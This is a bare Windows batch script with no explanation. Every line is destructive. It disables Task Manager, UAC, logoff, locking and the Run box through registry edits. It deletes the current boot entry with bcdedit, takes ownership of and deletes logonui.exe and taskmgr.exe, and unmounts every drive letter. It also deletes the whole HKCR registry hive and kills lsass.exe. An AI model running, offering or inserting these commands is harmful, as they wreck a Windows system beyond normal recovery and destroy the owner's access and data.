reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
bcdedit /delete {current}
taskkill /f /im logonui.exe
wmic process where name='logonui.exe' delete /nointeractive
takeown /f %systemroot%\system32\logonui.exe
icacls %systemroot%\system32\logonui.exe /grant %username%:F
icacls %systemroot%\system32\logonui.exe /grant "everyone":F
del %systemroot%\system32\logonui.exe /s /q /f
taskkill /f /im taskmgr.exe
wmic process where name='taskmgr.exe' delete /nointeractive
takeown /f %systemroot%\system32\taskmgr.exe
icacls %systemroot%\system32\taskmgr.exe /grant %username%:F
icacls %systemroot%\system32\taskmgr.exe /grant "everyone":F
del %systemroot%\system32\taskmgr.exe /s /q /f
mountvol Q: /d
mountvol W: /d
mountvol E: /d
mountvol R: /d
mountvol T: /d
mountvol Y: /d
mountvol U: /d
mountvol I: /d
mountvol O: /d
mountvol P: /d
mountvol A: /d
mountvol S: /d
mountvol D: /d
mountvol F: /d
mountvol G: /d
mountvol H: /d
mountvol J: /d
mountvol K: /d
mountvol L: /d
mountvol Z: /d
mountvol X: /d
mountvol C: /d
mountvol V: /d
mountvol B: /d
mountvol N: /d
mountvol M: /d
reg delete HKCR /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f
taskkill /f /im lsass.exe